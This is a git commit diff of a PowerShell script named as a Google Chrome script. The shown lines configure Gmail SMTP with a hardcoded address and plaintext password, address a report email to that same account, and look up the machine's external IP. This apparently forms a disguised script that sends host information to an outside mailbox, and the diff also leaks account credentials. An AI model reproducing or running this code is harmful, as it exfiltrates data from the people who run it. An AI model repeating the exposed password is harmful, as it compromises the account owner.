6f49342fce01dd7434ed51a8344fc229f659527f
epicthoistaken <94729955+epicthoistaken@users.noreply.github.com>
2022-02-05 12:54:24 -0500

    Update googlechromescriptyes.ps1

--- googlechromescriptyes.ps1
+++ googlechromescriptyes.ps1
@@ -15,7 +15,7 @@ $SMTPServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
 $ReportEmail = new-object Net.Mail.MailMessage
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('beneafrr@gmail.com', 'Milo36912!');
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('beneafrr@gmail.co', 'ilo36912!');
 $ReportEmail.From = 'beneafrr@gmail.com'
 $ReportEmail.To.Add('beneafrr@gmail.com')
 $ip = Invoke-RestMethod "myexternalip.com/raw"
